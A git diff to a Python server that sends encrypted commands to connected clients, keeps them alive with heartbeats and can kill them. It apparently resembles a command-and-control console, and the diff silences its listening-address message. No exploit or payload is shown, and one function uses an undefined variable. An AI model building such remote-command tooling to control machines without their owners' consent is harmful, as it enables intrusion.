@@ -7,6 +7,7 @@ import time
 from concurrent.futures import ThreadPoolExecutor
 from crypto import Security
 from logger import DBLogger
+from tcp import Tcp
 
 logging.basicConfig(
     level=logging.DEBUG,
@@ -21,7 +22,7 @@ class Server:
     def __init__(self, ip, port):
         self.__commands = { "help" : (self.help, "Displays a help message, usage: help", 0),
                             "exit" : (self.exit, "Exits the server, usage: exit", 0),
-                            "display" : (self.display, "Displays active clients, usage: display", 0),
+                            "clients" : (self.clients, "Displays active clients, usage: clients", 0),
                             "send" : (self.send, "Sends a command to a client, usage: send <client_id> <command>", 2),
                             "kill" : (self.kill, "Kills a client, usage: kill <client_id>", 1),
                             "info" : (self.info, "Displays information about the server, usage: info", 0)}
@@ -40,7 +41,7 @@ class Server:
         # should we enable here tcp keep alive? 
         
     def listen(self):
-        print(f"Server listening on {self.ip}:{self.port}")
+        # print(f"Server listening on {self.ip}:{self.port}")
         while self.is_running:
             try:
                 conn, addr = self.socket.accept()
@@ -60,20 +61,18 @@ class Server:
         
     def heartbeat(self):
         while self.is_running:
-            time.sleep(5)
-            # logging.debug("Cleanup routine started")
+            time.sleep(1)
             with self.act_client_lock:
                 client_ids = list(self.active_clients.keys())
                 for cid in client_ids:
                     try:
                         conn = self.active_clients[cid][0]
-                        conn.sendall(b'\x00')
+                        Tcp.send(conn, b'\x00')
                     except:
                         logging.info(f"Client {cid} is not here, cleaning")
                         self.active_clients.pop(cid, None)
                         conn.close()
-                    
-        
+                            
     def run(self):
         threading.Thread(target=self.listen, daemon=True).start()
         threading.Thread(target=self.heartbeat, daemon=True).start()
@@ -100,8 +99,10 @@ class Server:
     def exit(self):
         self.is_running = False
         logging.info("Exiting server...")
+        for cid in list(self.active_clients.keys()):
+            self.kill(cid)
         
-    def display(self):
+    def clients(self):
         with self.act_client_lock:
             if not self.active_clients:
                 print("No active clients.")
@@ -113,8 +114,9 @@ class Server:
         def process(self, cid, conn, command):
             try:
                 logging.info(f"Sending command to client {client_id}: {command}")
-                conn.sendall(self.security.encrypt(client_id, command))
-                data = conn.recv(1024)
+                ciphertext = self.security.encrypt(cid, command)
+                Tcp.send(conn, ciphertext)
+                data = Tcp.recive(conn)
                 if data:
                     plaintext = self.security.decrypt(cid, data)
                     logging.info(f"Received data from client {cid}: {plaintext}")
